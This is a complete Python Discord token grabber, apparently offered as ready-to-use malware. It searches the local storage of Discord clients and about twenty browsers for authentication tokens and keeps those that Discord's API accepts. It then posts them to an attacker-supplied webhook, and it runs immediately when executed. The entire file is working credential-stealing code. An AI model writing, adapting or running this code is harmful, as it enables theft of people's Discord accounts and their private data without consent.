import requests, re, os, json

Webhook_URI = ""

TokenList = []

Discord_Path = {
    os.getenv("APPDATA")      + "\\Discord\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Lightcord\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\discordptb\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\discordcanary\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
    os.getenv("APPDATA")      + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
    
    os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Torch\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Kometa\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Orbitum\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb", 
    os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
}

def SendWebhook(URI, Message):
    requests.post(URI, headers={ "Content-Type": "application/json" }, data=json.dumps({ "content": Message, "username": "Token Grabber • RCΛ", "avatar_url": "https://media.discordapp.net/attachments/829512452705615923/829514607940730951/EL1T3.gif" }))

def Grabber():
    for path in Discord_Path:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for Token in re.findall(regex, l):
                        TokenList.append(Token)
    return TokenList

def Check():
    Grabber()
    msg = "```css\n"
    for Tokens in list(set(TokenList)):
        r = requests.get("https://discord.com/api/v8/users/@me/library", headers={"Authorization": Tokens, "Content-Type": "application/json"})
        if r.status_code == 200:
            msg += f"{Tokens}\n"
        else:
            TokenList.remove(Tokens)
    msg += "```"
    SendWebhook(Webhook_URI, msg)

Check()
